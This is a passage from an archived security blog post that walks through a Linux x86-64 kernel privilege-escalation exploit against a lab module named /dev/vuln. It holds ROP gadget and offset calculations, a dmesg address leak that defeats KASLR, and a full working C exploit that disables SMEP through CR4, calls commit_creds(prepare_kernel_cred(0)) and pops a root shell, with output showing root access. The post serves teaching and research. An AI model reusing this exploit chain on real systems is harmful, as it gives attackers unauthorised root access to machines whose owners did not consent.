poweroff <span class="token operator">-</span>f
</code></pre>

<p>and we recreate the file's structure :</p>

<p><code>find . |cpio -H newc -o | gzip &gt; ../initramfs.img</code></p>

<p>We can now extract gadgets with ROPgadget:  </p>

<pre style="background-color: #272822"><code><font color="white">~<font color="red">$</font> ROPgadget --binary bzImage_KASLROFF | grep "pop rdi ; ret"  
...
0xffffffff810b33bd : pop rdi ; ret  
...
</font></code></pre>

<p>With the same kernel, we collect usefull addresses such as :</p>

<ul>
<li>commit_ creds : ffffffff810a1cf0</li>
<li>prepare<em>kernel</em>cred : ffffffff810a2060</li>
</ul>

<p>The offset for the gadget "pop rdi" is :</p>

<p><code>popRDIret - prepare_ kernel_creds = 0x1135d</code></p>

<p>The offset was found with the kernel KASLR OFF, let's see if the offset is different with the kernel KASLR ON :</p>

<pre style="background-color: #272822"><code><font color="white">~<font color="red">$</font> cat /proc/kallsyms | grep prepare_kernel_cred  
ffffffffb90a21c0 T prepare_kernel_cred  
...
~<font color="red">$</font> cat /proc/kallsyms | grep commit_creds
ffffffffb90a1e50 T commit_creds  
...
(in another terminal)
...
(gdb) x/2i ffffffffb90a21c0+0x1135d
   0xffffffffb90b351d:  pop    rdi
   0xffffffffb90b351e:  ret
</font></code></pre>

<p>We can do the same to retrieve other gadgets such as:</p>

<ul>
<li>mov </li>
<li>swapgs</li>
<li>iretq</li>
</ul>

<p>Continuing with the kernel KASLR ON, we calculate the offset between the usefull address found in dmesg and prepare_ kernel_ cred / commit_ creds:</p>

<pre style="background-color: #272822"><code><font color="white">~<font color="red">$</font> dmesg  
...
[    0.208567] Freeing SMP alternatives memory: 24K (ffffffffb9ea9000 - ffffffffb9eaf000)
...
</font></code></pre>

<ul>
<li>ffffffffb9ea9000 - ffffffffb90a1e50 = 0xe071b0 =&gt; commit_ creds_offset</li>
<li>ffffffffb9ea9000 - ffffffffb90a21c0 = 0xe06e40 =&gt; prepare_ kernel_ cred_ offset</li>
</ul>

<p>We now have everythings to exploit, so we can set back the kptr_restric protection.</p>

<h4 id="exploit">Exploit</h4>

<p>The exploit is simple :</p>

<ul>
<li>execute dmesg</li>
<li>find the usefull address</li>
<li>prepare the payload</li>
<li>trigger the vulnerablity</li>
</ul>

<p>The payload has the following content:</p>

<ul>
<li>offset before RIP</li>
<li>POP RDI; RET</li>
<li>MOV CR4, RDI; RET</li>
<li>commit_ creds(prepare_ kernel_ cred(0))</li>
<li>swapgs</li>
<li>iretq</li>
<li>safe strucure</li>
</ul>

<p>Here is the final exploit:</p>

<pre class=" language-c"><code class=" language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;errno.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;assert.h&gt;</span></span>

<span class="token keyword">struct</span> cred<span class="token punctuation">;</span>  
<span class="token keyword">struct</span> task_struct<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> cred <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred_t<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> task_struct <span class="token operator">*</span>daemon<span class="token punctuation">)</span> <span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">regparm</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds_t<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> cred <span class="token operator">*</span>new<span class="token punctuation">)</span> <span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">regparm</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

prepare_kernel_cred_t   prepare_kernel_cred<span class="token punctuation">;</span>  
commit_creds_t    commit_creds<span class="token punctuation">;</span>

<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_cs<span class="token punctuation">;</span>  
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_ss<span class="token punctuation">;</span>  
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_rflags<span class="token punctuation">;</span>  
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/*
  this function is needed to backup userland env
  these values are necessary just after the iretq calls
*/</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
  <span class="token keyword">asm</span><span class="token punctuation">(</span>
  <span class="token string">"movq %%cs, %0\n"</span>
  <span class="token string">"movq %%ss, %1\n"</span>
  <span class="token string">"pushfq\n"</span>
  <span class="token string">"popq %2\n"</span>
  <span class="token punctuation">:</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">:</span> <span class="token string">"memory"</span>     <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">/* function to get root id */</span>
<span class="token keyword">void</span> getroot <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>  
<span class="token punctuation">{</span>
  <span class="token function">commit_creds</span><span class="token punctuation">(</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">/*
  this function checks if we got the root id and pops a shell if we did
  the memory address of the function is placed in the ROP
*/</span>
<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] getuid() ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" [root]\n[+] Enjoy your shell...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] not root\n[+] failed !!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">/*
  This function tries to find the usefull addr needed for the expoit
*/</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">findAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
  <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Freeing SMP alternatives memory: 24K"</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> found<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> addr<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>

  FILE<span class="token operator">*</span> file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/dmesg"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">strncpy</span><span class="token punctuation">(</span>found<span class="token punctuation">,</span>line<span class="token operator">+</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">sscanf</span><span class="token punctuation">(</span>found<span class="token punctuation">,</span><span class="token string">"%p"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">fclose</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>addr<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"    dmesg error...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> addr<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> payload<span class="token punctuation">[</span><span class="token number">237</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>p           <span class="token operator">=</span> payload<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> memOffset<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/* execute dmesg and place result in a file */</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Excecute dmesg...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg &gt; /tmp/dmesg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/* find: Freeing SMP alternatives memory    */</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Find usefull addr...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  memOffset <span class="token operator">=</span> <span class="token function">findAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"    addr[0x%llx]\n"</span><span class="token punctuation">,</span> memOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/* set value for commit_creds and prepare_kernel_cred */</span>
  commit_creds        <span class="token operator">=</span> <span class="token punctuation">(</span>commit_creds_t<span class="token punctuation">)</span><span class="token punctuation">(</span>memOffset <span class="token operator">-</span> <span class="token number">0xe071b0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  prepare_kernel_cred <span class="token operator">=</span> <span class="token punctuation">(</span>prepare_kernel_cred_t<span class="token punctuation">)</span><span class="token punctuation">(</span>memOffset <span class="token operator">-</span> <span class="token number">0xe06e40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/* open fd on /dev/vuln                             */</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Open vuln device...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/vuln"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"    Can't open device file: /dev/vuln\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">/* payload                          */</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Construct the payload...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">/* offset before RIP                    */</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">116</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* pop rdi ; ret                    */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> poprdi <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>prepare_kernel_cred<span class="token operator">+</span><span class="token number">0x1135d</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">&amp;</span>poprdi<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"    pop RDI      at 0x%lx\n"</span><span class="token punctuation">,</span> poprdi<span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"\xf0\x06\x00\x00\x00\x00\x00\x00"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* SMEP OFF */</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* mov cr4, rdi ; pop rbp ; ret     */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> movcr4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>prepare_kernel_cred<span class="token number">-0x86880</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">&amp;</span>movcr4<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"    mov CR4, RDI at 0x%lx\n"</span><span class="token punctuation">,</span> movcr4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"\x42\x42\x42\x42\x42\x42\x42\x42"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* for rbp */</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* getroot                        */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> gr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>getroot<span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">&amp;</span>gr<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* swapgs; pop rbp; ret           */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> swapgs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>prepare_kernel_cred<span class="token number">-0x3dfbc</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"    swapgs       at 0x%lx\n"</span><span class="token punctuation">,</span> swapgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">&amp;</span>swapgs<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"\x42\x42\x42\x42\x42\x42\x42\x42"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* for rbp */</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* iretq                          */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> iretq <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>prepare_kernel_cred<span class="token number">-0x61066</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"    iretq        at 0x%lx\n"</span><span class="token punctuation">,</span> iretq<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">&amp;</span>iretq<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*
    the stack should look like this after an iretq call
      RIP
      CS
      EFLAGS
      RSP
      SS
*/</span>
<span class="token comment" spellcheck="true">/* shell                          */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> sh <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>shell<span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">&amp;</span>sh<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* user_cs                        */</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">&amp;</span>user_cs<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* user_rflags                    */</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">&amp;</span>user_rflags<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* stack of userspace             */</span>
  <span class="token keyword">register</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rsp <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"rsp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> sp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>rsp<span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">&amp;</span>sp<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* user_ss                        */</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">&amp;</span>user_ss<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/* trig the vuln                  */</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Trig the vulnerablity...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>

<p>Can I get root please:  </p>

<pre style="background-color: #272822"><code><font color="white">~<font color="red">$</font> whoami  
blackbunny  
~<font color="red">$</font> cat /proc/kallsyms | grep commit_creds
0000000000000000 T commit_creds  
0000000000000000 R __ksymtab_commit_creds  
0000000000000000 r __kcrctab_commit_creds  
0000000000000000 r __kstrtab_commit_creds  
~<font color="red">$</font> /tmp/exploit
[+] Excecute dmesg...
[+] Find usefull addr...
    addr[0xffffffffbeea9000]
[+] Open vuln device...
[+] Construct the payload...
    pop RDI      at 0xffffffffbe0b351d
    mov CR4, RDI at 0xffffffffbe01b940
    swapgs       at 0xffffffffbe064204
    iretq        at 0xffffffffbe04115a
[+] Trig the vulnerablity...
[+] getuid() ... [root]
[+] Enjoy your shell...
~<font color="red">#</font> whoami
root  
</font></code></pre>
        </section>
<div id="disqus_thread"><iframe id="dsq-app7568" name="dsq-app7568" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/saved_resource.html" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 0px !important;" allow="autoplay &#39;self&#39;; fullscreen &#39;self&#39;"></iframe></div>
<script>

/**
 *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
 *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
/*
var disqus_config = function () {
    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = '//web.archive.org/web/20171029060939/http://blackbunny.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://web.archive.org/web/20171029060939/https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
                                    

        <footer class="post-footer">



            <section class="author">
                <h4><a href="https://web.archive.org/web/20171029060939/http://www.blackbunny.io/author/blackndoor/">blackndoor</a></h4>

                    <p>Read <a href="https://web.archive.org/web/20171029060939/http://www.blackbunny.io/author/blackndoor/">more posts</a> by this author.</p>
                <div class="author-meta">
                    
                    
                </div>
            </section>


            <section class="share">
                <h4>Share this post</h4>
                <a class="icon-twitter" href="https://web.archive.org/web/20171029060939/https://twitter.com/intent/tweet?text=Linux%20Kernel%20x86-64%20bypass%20SMEP%20-%20KASLR%20-%20kptr_restric&amp;url=http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/" onclick="window.open(this.href, &#39;twitter-share&#39;, &#39;width=550,height=235&#39;);return false;">
                    <span class="hidden">Twitter</span>
                </a>
                <a class="icon-facebook" href="https://web.archive.org/web/20171029060939/https://www.facebook.com/sharer/sharer.php?u=http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/" onclick="window.open(this.href, &#39;facebook-share&#39;,&#39;width=580,height=296&#39;);return false;">
                    <span class="hidden">Facebook</span>
                </a>
                <a class="icon-google-plus" href="https://web.archive.org/web/20171029060939/https://plus.google.com/share?url=http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/" onclick="window.open(this.href, &#39;google-plus-share&#39;, &#39;width=490,height=530&#39;);return false;">
                    <span class="hidden">Google+</span>
                </a>
            </section>


        </footer>

    </article>
</main>

<aside class="read-next">
    <a class="read-next-story no-cover" href="https://web.archive.org/web/20171029060939/http://www.blackbunny.io/rc3-ctf-2016-misc500-writeup-finding-phil/">
        <section class="post">
            <h2>RC3 CTF 2016 - Misc500 Writeup (Finding Phil)</h2>
            <p>This was an entertaining and fun challenge, and reminded me a bit of the Cicada 3301 challenges, so it…</p>
        </section>
    </a>
    <a class="read-next-story prev no-cover" href="https://web.archive.org/web/20171029060939/http://www.blackbunny.io/solving-a-crack-me-with-triton-and-pin-a-k-a-the-lazy-way/">
        <section class="post">
            <h2>Solving a Crack Me with Triton and Pin (a.k.a the lazy way)</h2>
            <p>Some definitions As stated in Triton's home page:   Triton is a dynamic binary analysis (DBA) framework. It provides internal…</p>
        </section>
    </a>
</aside>



        <footer class="site-footer clearfix">
            <section class="copyright"><a href="https://web.archive.org/web/20171029060939/http://blackbunny.io/">Black Bunny</a> © 2017</section>
        </footer>

    </div>

    <script type="text/javascript" src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/jquery-1.12.0.min.js.下載"></script>
    
    <script type="text/javascript" src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/jquery.fitvids.js.下載"></script>
    <script type="text/javascript" src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/index.js.下載"></script>
    <script type="text/javascript" src="./2016 - Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric_files/prism.js.下載"></script>



<!--
     FILE ARCHIVED ON 06:09:39 Oct 29, 2017 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 00:41:19 Dec 02, 2021.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  captures_list: 165.67
  exclusion.robots: 0.162
  exclusion.robots.policy: 0.156
  RedisCDXSource: 4.154
  esindex: 0.005
  LoadShardBlock: 142.838 (3)
  PetaboxLoader3.datanode: 575.943 (5)
  CDXLines.iter: 14.914 (3)
  load_resource: 1243.442 (2)
  PetaboxLoader3.resolve: 603.023
